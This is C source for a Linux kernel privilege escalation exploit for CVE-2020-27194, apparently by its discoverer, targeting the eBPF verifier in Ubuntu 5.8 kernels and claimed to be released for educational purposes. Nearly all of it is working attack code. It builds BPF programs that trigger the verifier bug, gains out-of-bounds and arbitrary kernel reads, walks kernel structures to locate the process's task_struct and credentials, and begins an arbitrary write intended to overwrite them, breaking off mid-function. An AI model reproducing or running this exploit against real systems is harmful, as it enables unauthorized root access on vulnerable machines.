/**
	Kernel exploit for CVE-2020-27194, targeting Ubuntu kernels in the 5.8.* range.
	The vulnerability was fixed in the mainline kernel with commit 
	https://github.com/torvalds/linux/commit/5b9fbeb75b6a98955f628e205ac26689bcb1383e

	The exploit drops into an interactive root shell.

	Vulnerability Discovery: Simon Scannell
	Exploit author: Simon Scannell
	Write-Up: https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/

	This exploit was released weeks after disclosure, when other exploits have already
	been release and the purpose of this release it not to enable anyone to do harm
	to someone else.
	The exploit is released strictly for educational purposes and so that I can showcase my 
	work.
*/
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <errno.h>
#include <error.h>


// Instruction macros
#define BPF_JMP32	0x06

/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */

#define BPF_ALU64_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })


/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */

#define BPF_ALU64_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })


/* Short form of mov, dst_reg = src_reg */

#define BPF_MOV64_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })


#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })


#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = (__u32) (IMM) }),			\
	((struct bpf_insn) {					\
		.code  = 0, /* zero is reserved opcode */	\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = ((__u64) (IMM)) >> 32 })

#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD	1
#endif

/* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */
#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
#define BPF_LD_MAP_FD(DST, MAP_FD)				\
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)


/* Memory load, dst_reg = *(uint *) (src_reg + off16) */
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = src_reg */

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })


#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })


#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Raw code statement block */

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Program exit */

#define BPF_EXIT_INSN()						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_EXIT,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = 0 })


#define BPF_MAP_TYPE_STACK (23)

// offset from the array chunk to the map_ops pointer
const int64_t map_ops_off = 0x110;

// offset from the array chunk to the BTF field of the map
const int64_t map_btf_off = 0xd0;

// offset from the init_pid_ns to the radix tree root 
const int64_t radix_tree_root_off = 0x8;

// offset from the radix tree root to xa_head_off
const int64_t xa_head_off = 0x8;

// offset from the pid task to the PID task list
const int64_t pid_tasks_off = 0x10;

// offset from the linked list entry to the beginning of the task struct
const int64_t list_task_off = 0x950;

// offsets to fields from the base (vary depending on config) 
const int64_t cred_off = 0xa88;
const int64_t files_off = 0xae0;

// offset from struct_files to the fd table pointer
const int64_t fdtab_off = 0x20;

// offset from the FD table pointer to the map
const int64_t fd_off = 0x8;

// offset from struct file to private_data member
const int64_t private_data_off = 0xc8;

// size of the bpf_map_ops structure we want to create a full copy of! 
const uint64_t bpf_map_ops_size = 0x108;

// offsets to function pointers within map ops we want to read / overwrite 
const uint64_t bpf_map_get_nex_key_off = 0x20;
const uint64_t bpf_map_push_elem_off = 0x70;

// offsets from the beginning of the memory chunk to fields in bpf_map
const uint64_t map_type_off = 0xf8;
const uint64_t map_spinlock_off = 0xe4;
const uint64_t max_entries_off = 0xec;

const uint64_t uid_off = 0x4;
const uint64_t gid_off = 0x8;
const uint64_t euid_off = 0x14;


typedef struct _exploit_ctx {
	int prog_fd;
	int corrupt_map_fd;
	int storage_map_fd;
	void *map_ops;
	int needs_cleanup;

	char *init_pid_ns_name;
	void *init_pid_ns;

	pid_t pid;

	void *task_struct;
	void *cred;
	void *real_cred;
	void *files;
	void *corrupt_map;

	int write_occured;
} exploit_ctx;

void panic(const char *msg, exploit_ctx *ctx);

int bpf(unsigned cmd, union bpf_attr *attr, size_t size)
{
	return syscall(321, cmd, attr, size);
}


static int open_tcp_sock()
{
	int sock, err;
	sock = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
	assert(sock != -1);

	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(1337);
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	err = bind(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
	assert(err != -1);

	assert(listen(sock, 5) == 0);

	struct sockaddr bin;
	socklen_t bin_size = sizeof(bin);

	return sock;
}



	/**
	 * This is the main part of this PoC.
	 * We will use the following registers, after initialization:
	 * 	- BPF_REG_0 will contain the constant 0 used as a return value of the program
	 * 	- BPF_REG_3 will contain a ptr to the storage map
	 * 	- BPF_REG_4 will contain the corrupted map pointer
	 * 	- BPF_REG_5 will contain the special value obtained from the map
	 * 	- BPF_REG_6 will contain 64bit immediates to set the min/max bounds of the special register (5)
	 * 	- BPF_REG_7 will finally contain the value which the verifier believes to be 0 but is actually our arbitrary offset
	 *	- BPF_REG_8 will contain the leaked value
	 *	- BPF_REG_9 is an extra reg that can be used to make copies etc
	 */
#define STORAGE_PTR_REG		BPF_REG_3
#define CORRUPTED_PTR_REG	BPF_REG_4
#define SPECIAL_VAL_REG		BPF_REG_5
#define CONST_REG			BPF_REG_6
#define INVALID_OFFSET_REG	BPF_REG_7	
#define LEAKED_VAL_REG		BPF_REG_8
#define EXTRA_REG			BPF_REG_9


#define LOAD_STORAGE_MAP \



#define LOAD_CORRUPT_MAP \


#define EXPLOIT_SKELETON \
		/* Load the corrupt map */ \
		BPF_MOV64_IMM(BPF_REG_0, 0),	\
		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),	\
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),	\
		BPF_LD_MAP_FD(BPF_REG_1, ctx->corrupt_map_fd),	\
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),	\
		\
		/* Verify the pointer to the corrupt map is valid */ \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),	\
		BPF_EXIT_INSN(),	\
		/* Save the pointer momentarily in register 7, registers 0...5 will be reset after second call*/ \
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),	\
		\
		/* Load the storage map */	\
		BPF_MOV64_IMM(BPF_REG_0, 0),	\
		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),	\
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),	\
		BPF_LD_MAP_FD(BPF_REG_1, ctx->storage_map_fd),	\
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),	\
		\
		/* Verify the pointer to the corrupt map is valid */ \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),	\
		BPF_EXIT_INSN(),	\
		BPF_MOV64_REG(STORAGE_PTR_REG, BPF_REG_0),	\
		/* Save the corrupt map pointer in the right register */ \
		BPF_MOV64_REG(CORRUPTED_PTR_REG, BPF_REG_7), \
		/* Load 1 into the retval reg to reject packets */ \
		BPF_MOV64_IMM(BPF_REG_0, 1), \
		\
		/* Load the special value from the map */ \
		BPF_LDX_MEM(BPF_DW, SPECIAL_VAL_REG, STORAGE_PTR_REG, 0),	\
		/* jump over the exit() if the value derived from the map < 25769803778 */ \
		/* umax_val =  25769803777 after this (0b11000000000000000000000000000000001) */ \
		BPF_LD_IMM64(CONST_REG, 25769803778UL), \
		BPF_JMP_REG(BPF_JLT, SPECIAL_VAL_REG, CONST_REG, 1), \
		BPF_EXIT_INSN(),	\
		\
		/* Set the umin value of the derived value to 1. */ \
		BPF_JMP_IMM(BPF_JGT, SPECIAL_VAL_REG, 0, 1), \
		BPF_EXIT_INSN(),	\
		\
		/* Trigger the bug. After these two instructions the verifier believes */ \
		/* that INVALID_OFFSET_REG contains the const 1, altough in our case it contains 2 */ \
		BPF_ALU64_IMM(BPF_OR, SPECIAL_VAL_REG, 0),	\
		BPF_MOV32_REG(INVALID_OFFSET_REG, SPECIAL_VAL_REG),	\
		\
		/* Shifting the value, which the verifier believes to be 1 turns it into 1 but the verifier believes */	\
		/* it to be 0 */ 	\
		/* This allows us to multiply the offset by an arbitrary value (the verifier will still believe it is 0) */	\
		BPF_ALU64_IMM(BPF_RSH, INVALID_OFFSET_REG, 1),





enum exploit_stage {
	SETUP_MAPS,
	TEST_OOB_READ,
	TEST_ARBITRARY_READ,
	FIND_STRTAB,
	FIND_INIT_PID_NS,
	FIND_TASK_STRUCT,
	OVERWRITE_CREDS,
	CLEANUP,
	
};

#define SPECIAL_VAL 8589934595UL
#define STORAGE_MAP_SIZE (8192)

static int setup_maps(int *corrput_map_fd, int *storage_map_fd)
{
	// We need to set up two BPF maps, one which we will corrupt and one to store information in for later
	// Create an array map with a single entry, the size doesn't really matter. However, the larger the map the further we can go OOB
	uint64_t key = 0;
	union bpf_attr corrupt_map = {
		.map_type = BPF_MAP_TYPE_ARRAY,
		.key_size = 4,
		.value_size = STORAGE_MAP_SIZE,
		.max_entries = 1,
	};

	strcpy(corrupt_map.map_name, "corrupt_map");
	*corrput_map_fd = (__u32)bpf(BPF_MAP_CREATE, &corrupt_map, sizeof(corrupt_map));
	if (*corrput_map_fd < 0)
		return 0;


	// Zero the buffer. The contents of this map are not important
	unsigned long buf[STORAGE_MAP_SIZE / sizeof(long long)];
	memset(buf, 0, sizeof(buf));
	union bpf_attr update_map_corrupt = {
		.map_fd = *corrput_map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)&buf,
	};
	if (bpf(BPF_MAP_UPDATE_ELEM, &update_map_corrupt, sizeof(update_map_corrupt)) < 0 )
		return 0;
	

	// Set up the second, valid map in which we can store information
	key = 0;
	union bpf_attr storage_map = {
		.map_type = BPF_MAP_TYPE_ARRAY,
		.key_size = 4,
		.value_size = STORAGE_MAP_SIZE,
		.max_entries = 1
	};
	strcpy(storage_map.map_name, "storage_map");
	*storage_map_fd = (__u32)bpf(BPF_MAP_CREATE, &corrupt_map, sizeof(corrupt_map));
	if (*storage_map_fd < 0)
		return 0;


	// The first value of the storage map is always the magic val that leads to OOB
	memset(buf, 0, sizeof(buf));
	buf[0] = SPECIAL_VAL;
	union bpf_attr update_map_storage = {
		.map_fd = *storage_map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)&buf,
	};
	if (bpf(BPF_MAP_UPDATE_ELEM, &update_map_storage, sizeof(update_map_storage)) )
		return 0;

	return 1;
}


static int setup_listener_sock()
{
	int sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
	if (sock_fd < 0) {
		return sock_fd;
	}

	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(1337);
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	int err = bind(sock_fd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
	if (err < 0)
		return err;

	err = listen(sock_fd, 32);
	if (err < 0)
		return err;

	return sock_fd;
}


static int setup_send_sock()
{
	return socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
}


// loads a prog and returns the FD
static int load_prog(struct bpf_insn *instructions, size_t insn_count)
{
	union bpf_attr prog = {};
	prog.license = (uint64_t)"GPL";
	strcpy(prog.prog_name, "exploit");
	prog.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
	prog.insn_cnt = insn_count;
	prog.insns = (uint64_t)instructions;

	// load the BPF program
	int prog_fd = bpf(BPF_PROG_LOAD, &prog, sizeof(prog));

	if (prog_fd < 0) {
		return 0;
	}

	return prog_fd;
}

static int trigger_prog(int prog_fd)
{
	int listener_sock = setup_listener_sock();
	int send_sock = setup_send_sock();

	if (listener_sock < 0 || send_sock < 0)
		return 0;

	if (setsockopt(listener_sock, SOL_SOCKET, SO_ATTACH_BPF, &prog_fd,
		       sizeof(prog_fd)) < 0) {
		return 0;
	}

	// trigger execution by connecting to the listener socket
	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(1337);
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	// no need to check connect, it will fail anyways
	connect(send_sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr));

	close(listener_sock);
	close(send_sock);
	return 1;

}


#define PROG_INSN_COUNT(instrs) (sizeof(instrs) / sizeof(instrs[0]))
static int exec_prog(struct bpf_insn *instructions, size_t insn_count)
{	

	int prog_fd = load_prog(instructions, insn_count);

	if (!prog_fd)
		return 0;

	return trigger_prog(prog_fd);
}



static int read_storage_map(exploit_ctx *ctx, void *buf, size_t size)
{
	// the storage map is at most 8192 byte large
	assert(size <= STORAGE_MAP_SIZE - 8);

	// lookup the elements
	unsigned long lk[STORAGE_MAP_SIZE / sizeof(long long)];
	memset(lk, 0, sizeof(lk));
	uint64_t key = 0;
	union bpf_attr lookup_map = {
		.map_fd = ctx->storage_map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)&lk
	};
	int err = bpf(BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map));
	if (err < 0)
		return 0;

	// +1 since we want so kip the first entry (the special val)
	memcpy(buf, lk + 1, size);

	return 1;
}

static int write_storage_map(exploit_ctx *ctx, void *buf, size_t size)
{
	// the storage map is at most 8192 byte large
	assert(size <= STORAGE_MAP_SIZE - 8);

	unsigned long data[STORAGE_MAP_SIZE / sizeof(long long)];
	memset(data, 0, sizeof(data));

	// the first entry is always the special value
	data[0] = SPECIAL_VAL;

	// copy the rest of the data
	memcpy(data + 1, buf, size);

	uint64_t key = 0;

	union bpf_attr update_map = {
		.map_fd = ctx->storage_map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)&data
	};
	int err = bpf(BPF_MAP_UPDATE_ELEM, &update_map, sizeof(update_map));
	if (err < 0)
		return 0;

	return 1;
}


static int write_corrupt_map(exploit_ctx *ctx, void *buf, size_t size)
{
	// the corrupt map is at most 8192 byte large
	assert(size <= STORAGE_MAP_SIZE);

	unsigned long data[STORAGE_MAP_SIZE / sizeof(long long)];
	memset(data, 0, sizeof(data));

	// copy the rest of the data
	memcpy(data, buf, size);

	uint64_t key = 0;

	union bpf_attr update_map = {
		.map_fd = ctx->corrupt_map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)&data
	};
	int err = bpf(BPF_MAP_UPDATE_ELEM, &update_map, sizeof(update_map));
	if (err < 0)
		return 0;

	return 1;
}


static unsigned long test_oob_read(exploit_ctx *ctx)
{

	// in this step, read the map_ops pointer at offset -272 off the base of the map
	struct bpf_insn instrs[] = {
		EXPLOIT_SKELETON


		BPF_ALU64_IMM(BPF_MUL, INVALID_OFFSET_REG, map_ops_off),
		BPF_ALU64_REG(BPF_SUB, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),
		BPF_LDX_MEM(BPF_DW, LEAKED_VAL_REG, CORRUPTED_PTR_REG, 0),

		// Finally, store the leaked OOB value in our map
		BPF_STX_MEM(BPF_DW, STORAGE_PTR_REG, LEAKED_VAL_REG, 8),

		// Exit
		BPF_EXIT_INSN(),

	};

	int err = exec_prog(instrs, PROG_INSN_COUNT(instrs));
	if (!err)
		return 0;

	err = read_storage_map(ctx, &ctx->map_ops, sizeof(void *));
	if (!err)
		return 0;

	// Storage map[1] was initialized as 0. We tried to store the OOB read in it.
	// If it is still 0, the OOB read did not succeed
	if (ctx->map_ops == 0)
		return 0;

	return 1;
}

// the userspace struct is "incomplete" and doesn't contain the btf_id field
struct bpf_map_info_kernel {
	__u32 type;
	__u32 id;
	__u32 key_size;
	__u32 value_size;
	__u32 max_entries;
	__u32 map_flags;
	char  name[BPF_OBJ_NAME_LEN];
	__u32 ifindex;
	__u32 btf_vmlinux_value_type_id;
	__u64 netns_dev;
	__u64 netns_ino;
	__u32 btf_id;
	__u32 btf_key_type_id;
	__u32 btf_value_type_id;
} __attribute__((aligned(8)));

static int arbitrary_read_4(exploit_ctx *ctx, void *addr, uint32_t *buf)
{	
	// keep the program fd around so we don't have to constantly load it
	static int read_prog_fd = 0;

	// 0x58 is the offset of ID from the beginning of the BTF struct
	addr -= 0x58;

	// we store the address we want to read in storage_map[1]
	int err = write_storage_map(ctx, &addr, sizeof(void *));
	if (!err)
		return 0;

	// in this step, exploit the arbitrary read to read a local stack var into the storage map and compare
	struct bpf_insn instrs[] = {
		EXPLOIT_SKELETON

		// make it point to map->btf 0xd0
		BPF_ALU64_IMM(BPF_MUL, INVALID_OFFSET_REG, map_btf_off),
		BPF_ALU64_REG(BPF_SUB, CORRUPTED_PTR_REG, INVALID_OFFSET_REG),

		// overwrite it with the address we want to read, we load this value from the storage map + 8 (+1 unsigned long)
		BPF_LDX_MEM(BPF_DW, LEAKED_VAL_REG, STORAGE_PTR_REG, 8),
		BPF_STX_MEM(BPF_DW,  CORRUPTED_PTR_REG, LEAKED_VAL_REG , 0),

		// Exit
		BPF_EXIT_INSN(),

	};

	if (!read_prog_fd) {
		read_prog_fd = load_prog(instrs, PROG_INSN_COUNT(instrs));
		if (!read_prog_fd)
			return 0;
	}

	err = trigger_prog(read_prog_fd);
	if (!err)
		panic("Failed to load BPF program... Is the kernel vulnerable?", ctx);

	struct bpf_map_info_kernel info = {};
	union bpf_attr get_info = {
		.info.bpf_fd = ctx->corrupt_map_fd,
		.info.info = (long long unsigned int)&info,
		.info.info_len = sizeof(info)
	};
	err = bpf(BPF_OBJ_GET_INFO_BY_FD, &get_info, sizeof(get_info));
	if (err == -1)
		return 0;

	*buf = info.btf_id;

	return 1;
}

// Wrapper to read arbitrary bytes
static int arbitrary_read(exploit_ctx *ctx, void *addr, void *buf, size_t size)
{
	while(size) {
		uint32_t cur;
		arbitrary_read_4(ctx, addr, &cur);

		if (size >= 4) {
			*(uint32_t *)buf = cur;
			size -= 4;
			addr += 4;
			buf += 4;
		} else {

			memcpy(buf, &cur, size);
			size = 0;
		}
	}

	return 1;
}


// test by first calling BPF_OBJ_GET_INFO_BY_FD, then perform the arbitrary read on the map_ops struct
// and compare results;
static unsigned long test_arbitrary_read(exploit_ctx *ctx)
{	

	uint32_t res, buf;
	int err;

	struct bpf_map_info_kernel info = {};
	union bpf_attr get_info = {
		.info.bpf_fd = ctx->corrupt_map_fd,
		.info.info = (uint64_t)&info,
		.info.info_len = sizeof(info)
	};
	err = bpf(BPF_OBJ_GET_INFO_BY_FD, &get_info, sizeof(get_info));
	if (err == -1)
		return 0;

	res = info.btf_id;


	err = arbitrary_read_4(ctx, ctx->map_ops, &buf);
	if (!err)
		return 0;

	if (buf == res)
		return 0;

	return 1;
}


static unsigned long find_strtab(exploit_ctx *ctx)
{

	// begin reading from the address of the map_ops until we find the null terminated string "init_pid_ns"
	char found = 0;

	const char init_pid_ns[] = "init_pid_ns";

	char prev[sizeof(init_pid_ns)] = {};
	char cur[sizeof(init_pid_ns)] = {};
	void *cur_addr = ctx->map_ops;


	// count how many bytes are currently matching
	uint32_t matching = 0;

	// count how many bytes there are left to match
	uint32_t left = sizeof(init_pid_ns);

	// record where the match started
	void *match_start = 0;
	while (!found) {
		arbitrary_read(ctx, cur_addr, cur, sizeof(cur));
	
		
		for (uint32_t idx = 0; idx < sizeof(init_pid_ns); idx++) {

			if (cur[idx] == init_pid_ns[matching]) {
				matching++;
				left--;

				if (matching == 1)
					match_start = cur_addr + idx;

			// if the bytes do not match, reset
			} else {
				matching = 0;
				left = sizeof(init_pid_ns);
				match_start = 0;
			}

			// Check if we got a full match
			if (left == 0) {
				
				
				// in this case store the candidate and reset and return
				ctx->init_pid_ns_name = match_start;
				
				return 1;
			} 
		}



		cur_addr += sizeof(cur);
	}

	// we will never reach this statement. Either the string is (highly reliably) found or we search outside of the kernel and page fault
	return 1;
}



static unsigned long find_init_pid_ns(exploit_ctx *ctx)
{

	// We now have the address of the string of the init_pid_ns within the string tab section. This string is referenced by the struct kernel_symbol entry of its smybol within
	// the symtab section
	// this means we just do another iterative search beginning from map_ops and look for this pointer
	void *cur_addr = ctx->map_ops;
	while(1) {
		int offset;

		arbitrary_read(ctx, cur_addr, &offset, sizeof(int));

		// we found it!
		if (cur_addr + offset == ctx->init_pid_ns_name) {
			// the structure of a kernel symbol is UL struct kernel_symbol {int value_offset; int name_offset; ... }
			// so if we subtract 4 we get the offset to the actual symbol!
			int value_offset;
			arbitrary_read(ctx, cur_addr -4, &value_offset, sizeof(int));

			ctx->init_pid_ns = cur_addr -4 + value_offset;
			return 1;
		} 

		cur_addr += 1;
	}

	// this statement will never be reached. We either find the table entry or crash
	return 0;
}


struct xarray {
	int32_t	xa_lock;
	int32_t	xa_flags;
	void 	*xa_head;
};

#define XA_CHUNK_SIZE 64

struct xa_node {
	unsigned char	shift;		/* Bits remaining in each slot */
	unsigned char	offset;		/* Slot offset in parent */
	unsigned char	count;		/* Total entry count */
	unsigned char	nr_values;	/* Value entry count */
	struct xa_node  *parent;	/* NULL at top of tree */
	struct xarray	*array;		/* The array we belong to */
	char dummy[0x10];			// some dummy vals that replace annoying symbols and structs to deal with which we don't actually need
	void *slots[XA_CHUNK_SIZE];
}; 

#define radix_tree_node xa_node
#define radix_tree_root xarray

/*
static unsigned radix_tree_load_root(const struct radix_tree_root *root,
		struct radix_tree_node **nodep)
{
	struct radix_tree_node *node = rcu_dereference_raw(root->xa_head);

	*nodep = node;

	if (likely(radix_tree_is_internal_node(node))) {
		node = entry_to_node(node);
		return node->shift + RADIX_TREE_MAP_SHIFT;
	}

	*maxindex = 0;
	return 0;
} */

#define offsetof(type, member)  __builtin_offsetof (type, member)

#define RADIX_TREE_ENTRY_MASK		3UL
#define RADIX_TREE_INTERNAL_NODE	2UL
#define XA_CHUNK_SHIFT 6
#define RADIX_TREE_MAP_SHIFT	XA_CHUNK_SHIFT
#define RADIX_TREE_MAP_SIZE	(1UL << RADIX_TREE_MAP_SHIFT)
#define RADIX_TREE_MAP_MASK	(RADIX_TREE_MAP_SIZE-1)

static inline void *xa_mk_internal(unsigned long v)
{
	return (void *)((v << 2) | 2);
}

#define XA_RETRY_ENTRY		xa_mk_internal(256)
#define RADIX_TREE_RETRY	XA_RETRY_ENTRY

static inline char radix_tree_is_internal_node(void *ptr)
{
	return ((unsigned long)ptr & RADIX_TREE_ENTRY_MASK) ==
				RADIX_TREE_INTERNAL_NODE;
}

static inline struct radix_tree_node *entry_to_node(void *ptr)
{
	return (void *)((unsigned long)ptr & ~RADIX_TREE_INTERNAL_NODE);
}

static inline unsigned long shift_maxindex(unsigned int shift)
{
	return (RADIX_TREE_MAP_SIZE << shift) - 1;
}

static inline unsigned long node_maxindex(const struct radix_tree_node *node)
{
	return shift_maxindex(node->shift);
}

static unsigned radix_tree_load_root(exploit_ctx *ctx, const struct radix_tree_root *root,
		struct radix_tree_node **nodep, unsigned long *maxindex)
{
	struct xa_node node_read = {};
	struct xa_node *node;

		node = (struct xa_node *)root->xa_head;
		*nodep = node;
		if (radix_tree_is_internal_node(node)) {
			node = entry_to_node(node);
			arbitrary_read(ctx, node, &node_read, sizeof(node_read));
			*maxindex = node_maxindex(&node_read);

		} else {
			*maxindex = 0;
			return 0;
		}
}

static unsigned int radix_tree_descend(exploit_ctx *ctx, struct radix_tree_node *parent,
			struct radix_tree_node **nodep, unsigned long index)
{

	struct xa_node parent_read = {};
	arbitrary_read(ctx, parent, &parent_read, sizeof(parent_read));
	unsigned int offset = (index >> parent_read.shift) & RADIX_TREE_MAP_MASK;
	void **entry = parent_read.slots[offset];

	*nodep = (void *)entry;
	return offset;
}


static unsigned long find_task_struct(exploit_ctx *ctx)
{
	// First, get the radix tree root and the base
	struct xarray radix_root = {};
	arbitrary_read(ctx, ctx->init_pid_ns + radix_tree_root_off, &radix_root, sizeof(radix_root));

	// Get the IDR base index (it comes after the radix root)
	uint32_t idr_base;
	arbitrary_read(ctx, ctx->init_pid_ns + radix_tree_root_off + sizeof(struct xarray), &idr_base, sizeof(idr_base));

	ctx->pid -= idr_base;


	// Get the

	// Descend the tree until we find out pid struct
	//printf("abc slots pointer should be %p (offsetof=%lx)\n ", node + offsetof(struct xa_node, slots), offsetof(struct xa_node, slots));

	struct xa_node *node, *parent;
	struct xa_node node_read = {};
	unsigned long max_index = 0;
	restart:
		parent = NULL;
		// First step is to load the root node. this corresponds to radix_tree_load_root()
		radix_tree_load_root(ctx, &radix_root, &node, &max_index);

		while (radix_tree_is_internal_node(node)) {
			unsigned offset;
			parent = entry_to_node(node);
			// the PID is the index we are looking for
			offset = radix_tree_descend(ctx, parent, &node, ctx->pid);

			arbitrary_read(ctx, parent, &node_read, sizeof(node_read));

			if (node == RADIX_TREE_RETRY)
				goto restart;

			if (node_read.shift == 0)
				break;
		}


		// At this point, node contains the struct pid * pointer to the PID struct belonging to our task
		// we just need to convert it to the task_struct
		// the PID struct contains an array of lists, each containing a list of tasks that use the PID of the PID type (PID, TGID etc.)
		// since this task does not have any threads, there is only one entry in the list. All we need to do is read the first entry in the PID list and convert it to the task_struct pointer
		void *first;
		arbitrary_read(ctx, (void *)node + pid_tasks_off, &first, sizeof(void *));
		// the first entry of the PID list points to the list struct within the containing, task which his at offset 0x500.
		ctx->task_struct = first - list_task_off;


		// read the file descriptor table to get the private data pointer of the corrupted map, we will use it to store a copy of the function pointers of map ops in there.
		// this way we can achieve arbitrary write later.
		// also, store a pointer to the creds struct for later
		void *cred, *real_cred, *files;
		arbitrary_read(ctx, ctx->task_struct + cred_off, &cred, sizeof(void *));
		arbitrary_read(ctx, ctx->task_struct + files_off, &files, sizeof(void *));

		ctx->cred = cred;
		ctx->files = files;
		//ctx->real_cred = real_cred;

		// we also want to obtain a pointer to the corrupt map itself. To do this, we dereference files to get the struct files_struct. From there we dereference the fd table pointer
		// and use the corrupt map FD as offset to obtain the struct file pointer of the map. Finally, we read private_data.
	
		// now read the fdtab pointer
		void *fdtable;
		arbitrary_read(ctx, ctx->files + fdtab_off, &fdtable, sizeof(void *));
		int32_t count;
		arbitrary_read(ctx, ctx->files, &count, sizeof(int32_t));
		// now, read the pointer to the fd array
		void *fd;
		arbitrary_read(ctx, fdtable + fd_off, &fd, sizeof(void *));
		// now add the offset of the corrupt map
		uint64_t off = ctx->corrupt_map_fd * sizeof(void *);
		void *file;
		arbitrary_read(ctx, fd + off, &file, sizeof(void *));
		// Finally, read the private_data field
		void *map;
		arbitrary_read(ctx, file + private_data_off, &map, sizeof(void *));
		ctx->corrupt_map = map;

		return 1;
}

static int arbitrary_write_4(exploit_ctx *ctx, void *addr, uint32_t val)
{

	uint32_t data[STORAGE_MAP_SIZE / sizeof(uint32_t)];
	memset(data, 0, sizeof(data));

	// in order to get 0 we need to set the value to 2**32
	if (val == 0) {
		val = UINT32_MAX;
	} else {
	// all other values are just -1
		val -= 1;
